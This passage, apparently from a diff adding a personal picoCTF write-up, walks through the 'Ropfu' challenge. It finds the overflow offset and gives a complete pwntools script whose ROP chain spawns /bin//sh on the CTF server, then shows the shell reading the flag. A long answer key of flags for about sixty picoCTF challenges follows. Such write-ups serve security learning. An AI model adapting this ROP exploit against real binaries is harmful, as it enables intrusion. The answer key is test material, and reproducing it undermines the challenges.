+    where the offset is. I made a dummy payload to find out exactly what the offset was. This was the command I ran in terminal
+    to generate that payload:
+         python2 -c "print('a'*28+'b'*4)" > atk.txt
+    Putting this and using the content of the file as input, I got a segmentation fault that showed what the EIP was:
+        run < atk.txt
+        Starting program: ./vuln < atk.txt
+        How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
+
+        Program received signal SIGSEGV, Segmentation fault.
+        0x62626262 in ?? ()
+    The payload showed that the EIP was at address 0x62626262(ascii 'bbbb'), which was what I was expecting to see if I had the
+    correct offset(there were 28 a's as padding followed by 4 b's that would take the place of the ropchain). Afterwards, I 
+    needed to create a script that would allow me to exploit the script and steal the shell to get the flag. Being a fellow
+    user of python3, I had to reformat the code to be able to allow the payload to be generated and sent in one script. I used
+    pwntools' p32(converting to 32 bit little endian) function and I also used pwntools to also create the connection and use
+    the exploit. This is the script:
+        from pwn import *
+
+        def gen_payload():
+            p = b''
+            p += p32(0x080583c9) # pop edx ; pop ebx ; ret
+            p += p32(0x080e5060) # @ .data
+            p += p32(0x41414141) # padding
+            p += p32(0x080b074a) # pop eax ; ret
+            p += b'/bin'
+            p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
+            p += p32(0x080583c9) # pop edx ; pop ebx ; ret
+            p += p32(0x080e5064) # @ .data + 4
+            p += p32(0x41414141) # padding
+            p += p32(0x080b074a) # pop eax ; ret
+            p += b'//sh'
+            p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
+            p += p32(0x080583c9) # pop edx ; pop ebx ; ret
+            p += p32(0x080e5068) # @ .data + 8
+            p += p32(0x41414141) # padding
+            p += p32(0x0804fb90) # xor eax, eax ; ret
+            p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
+            p += p32(0x08049022) # pop ebx ; ret
+            p += p32(0x080e5060) # @ .data
+            p += p32(0x08049e39) # pop ecx ; ret
+            p += p32(0x080e5068) # @ .data + 8
+            p += p32(0x080583c9) # pop edx ; pop ebx ; ret
+            p += p32(0x080e5068) # @ .data + 8
+            p += p32(0x080e5060) # padding without overwrite ebx
+            p += p32(0x0804fb90) # xor eax, eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0808055e) # inc eax ; ret
+            p += p32(0x0804a3d2) # int 0x80
+            return p
+        def sendpayload(offset: int):
+            p = remote("saturn.picoctf.net",65067)
+            p.sendlineafter("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n",b"a"*offset+gen_payload())
+            p.interactive()
+        sendpayload(28)
+    Once I ran the script, I did see much at all, and I decided to run 'ls'(all files in the current directory) to see if the exploit
+    had worked. This is what I saw:
+        $ ls
+        flag.txt
+        vuln
+    With the displaying of files, it showed that my exploit worked and the I have stolen the shell. I ran the command 'cat flag.txt' to
+    view the flag, and I got the contents which were indeed the flag: picoCTF{5n47ch_7h3_5h311_0f7662f4}
+
+Flags:
+    File run 1: picoCTF{U51N6_Y0Ur_F1r57_F113_102c30db}
+    File run 2: picoCTF{F1r57_4rgum3n7_4653b5f6}
+    Includes: picoCTF{1nclu51v17y_1of2_f7w_2of2_4d305f36}
+    Basic File Exploit: picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_EDC30E9D}
+    Basic Mod 1: picoCTF{R0UND_N_R0UND_C0A86577}
+    Basic Mod 2: picoCTF{1nv3r53ly_h4rd_261cb530}
+    Inspect HTML: picoCTF{1n5p3t0r_0f_h7ml_b6602e8e}
+    SQLiLite: picoCTF{L00k5_l1k3_y0u_solv3d_it_cd1df56b}
+    Forbidden Paths: picoCTF{7h3_p47h_70_5ucc355_e73ad00d}
+    Secrets: picoCTF{succ3ss_@h3n1c@10n_f55d602d}
+    Cred Stuff: picoCTF{C7r1F_54V35_71M3}
+    RPS: picoCTF{50M3_3X7R3M3_1UCK_D80B11AA}
+    Redaction Gone Wrong: picoCTF{C4n_Y0u_S33_m3_fully}
+    Substitution0: picoCTF{5UB5717U710N_3V0LU710N_7B755B1A}
+    Substitution1: picoCTF{FR3QU3NCY_4774CK5_4R3_C001_E57444AC}
+    Substitution2: picoCTF{N6R4M_4N41Y515_15_73D10U5_6CDAEA76}
+    Patchme.py: picoCTF{p47ch1ng_l1f3_h4ck_c3daefb9}
+    Unpackme.py: picoCTF{175_chr157m45_188ab8c9}
+    Bloat.py: picoCTF{d30bfu5c4710n_f7w_2769cf94}
+    GDB Test Drive: picoCTF{d3bugg3r_dr1v3_50e616ac}
+    Safe Opener: picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}
+    Lookey Here: picoCTF{gr3p_15_@w3s0m3_4554f5f5}
+    Enhance!: picoCTF{3nh4nc3d_6783cc46}
+    Morse Code: picoCTF{wh47_h47h_90d_w20u9h7}
+    Power Cookie: picoCTF{gr4d3_A_c00k13_80bad8fa}
+    SQL Direct: picoCTF{L3arN_S0m3_5qL_t0d4Y_34fa2564}
+    Transposition-Trial: picoCTF{7R4N5P051N6_15_3XP3N51V3_5C82A0E0}
+    Vigenere: picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_y23c13p5}
+    Unpackme: picoCTF{up><_m3_f7w_01fb99cd}
+    Buffer Overflow0: picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}
+    Buffer Overflow1: picoCTF{addr3ss3s_ar3_3asy_b9797671}
+    Buffer Overflow2: picoCTF{argum3nt5_4_d4yZ_eb489c7a}
+    Buffer Overflow3: picoCTF{Stat1C_c4n4r13s_4R3_b4D_78734aff}
+    CVE-XXXX-XXXXX: picoCTF{CVE-2021-34527}
+    Packets Primer: picoCTF{p4ck37_5h4rk_d0565941}
+    Fresh Java: picoCTF{700l1ng_r3qu1r3d_c2475607}
+    Local Authority: picoCTF{j5_15_7r4n5p4r3n7_8086bcb1}
+    Sleuthkit Intro: picoCTF{mm15_f7w!}
+    Sleuthkit Apprentice: picoCTF{by73_5urf3r_152f373f}
+    Flag Leak: picoCTF{L34k1ng_Fl4g_0ff_St4ck_b840e879}
+    Rail Fence: picoCTF{WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_EB4C7D74}
+    Search Source: picoCTF{1nsp3ti0n_0f_w3bpag3s_869d23af}
+    File Types: picoCTF{f1len@m3_m@n1pul@t10n_f0r_0b2cur17y_347eae65}
+    Diffie-Hellman: picoCTF{C4354R_C1PH3R_15_4_817_0U7D473D_2DBF03F7}
+    Side Channel: picoCTF{t1m1ng_4tt4ck_8d0e5357}
+    Eavesdrop: picoCTF{nc_73115_411_445e5629}
+    Roboto Sans: picoCTF{Who_D03sN7_L1k5_90B0T5_6ac64608}
+    Bbbbloat: picoCTF{cu7_7h3_bl047_33e4341f}
+    St3g0: picoCTF{7h3r3_15_n0_5p00n_1b8d71db}
+    Operation Orchid: picoCTF{h4un71ng_p457_c512004e}
+    Operation Oni: picoCTF{k3y_5l3u7h_dc01cec5}
+    Sum-O-Primes: picoCTF{ee326097}
+    Very Smooth: picoCTF{7579cc73}
+    X-sixty-what: picoCTF{b1663r_15_b3773r_a0428cd7}
+    Sequences: picoCTF{b1g_numb3rs_cd8e813d}
+    Wizardlike: picoCTF{ur_4_w1z4rd_4B0DA5A9}
+    Wine: picoCTF{Un_v3rr3_d3_v1n_266a4ad8}
+    Torrent Analyze: picoCTF{ubuntu-19.10-desktop-amd64.iso}
+    Ropfu: picoCTF{5n47ch_7h3_5h311_0f7662f4}
+    
